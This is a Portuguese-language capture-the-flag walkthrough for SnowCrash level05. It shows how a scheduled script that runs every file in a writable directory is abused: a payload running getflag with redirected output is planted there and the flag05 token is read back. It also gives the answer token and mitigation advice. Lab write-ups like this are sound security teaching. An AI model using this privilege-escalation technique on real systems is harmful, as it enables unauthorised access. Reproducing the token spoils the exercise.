# SnowCrash — Level05 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é explorar uma **execução automática de scripts** feita por outro usuário, usando um diretório gravável.

O exercício ensina:

- análise de scripts automáticos
- abuso de diretórios graváveis
- privilege escalation indireto
- captura de saída de comandos privilegiados

---

## Pistas encontradas

Primeiro, foi observado que existia um script interessante em `/usr/sbin/openarenaserver`.

Comando usado para localizar:

```bash
find /usr/sbin -name openarenaserver 2>/dev/null
```

Depois, lendo o conteúdo do script:

```bash
cat /usr/sbin/openarenaserver
```

Conteúdo encontrado:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

---

## Entendimento do funcionamento

O script percorre todos os arquivos dentro de `/opt/openarenaserver/`.

Para cada arquivo encontrado, ele:

- executa o arquivo com `bash -x`
- aplica limite de CPU com `ulimit -t 5`
- apaga o arquivo depois com `rm -f`

Isso significa que qualquer script colocado em `/opt/openarenaserver/` será executado automaticamente.

Se esse script for executado pelo usuário `flag05`, então qualquer comando inserido ali rodará com os privilégios de `flag05`.

---

## Identificação da vulnerabilidade

A vulnerabilidade está em:

```bash
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Problema:

- o diretório é gravável
- scripts arbitrários podem ser criados por outro usuário
- esses scripts são executados automaticamente
- o sistema remove o arquivo depois, dificultando rastreio

Isso caracteriza **execução automática insegura em diretório controlado pelo usuário**.

---

## Exploração

Foi criado um script malicioso dentro de `/opt/openarenaserver/` contendo:

```bash
/bin/getflag > /tmp/token05 2>&1
```

Comando usado:

```bash
echo "/bin/getflag > /tmp/token05 2>&1" > /opt/openarenaserver/exploit
```

Depois, o arquivo recebeu permissão de execução:

```bash
chmod +x /opt/openarenaserver/exploit
```

O objetivo foi redirecionar a saída do `getflag` para um arquivo em `/tmp`, para poder ler o token após a execução automática.

---

## Captura do token

Após aguardar a execução automática, o token foi lido com:

```bash
cat /tmp/token05
```

Resultado:

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

**Token obtido:** `viuaaale9huek52boumoomioc`

---

## Conceito aprendido

Este exercício demonstra um problema clássico: **privilege escalation via automated script execution**.

Situação vulnerável típica:

```bash
for file in /some/writable/dir/*; do
    bash "$file"
done
```

Se usuários sem privilégio puderem escrever nesse diretório, eles podem executar comandos como outro usuário.

---

## Mitigação em ambiente real

Evitar:

- execução automática de arquivos em diretórios graváveis por usuários comuns
- uso de `bash "$i"` em caminhos não confiáveis
- remoção do arquivo apenas após execução, sem validação

Medidas corretas:

- restringir permissões do diretório
- validar origem e dono dos scripts
- usar diretórios privados e não graváveis
- evitar execução automática de conteúdo arbitrário

---

## Ferramentas e comandos utilizados

| Ferramenta / comando | Função |
|---|---|
| `find` | localizar script relevante |
| `cat` | ler conteúdo do script |
| `echo` | criar payload |
| `chmod +x` | tornar payload executável |
| `cat /tmp/token05` | ler o resultado do getflag |

---

## Resultado final

**Usuário explorado:** `flag05`

**Token obtido:** `viuaaale9huek52boumoomioc`
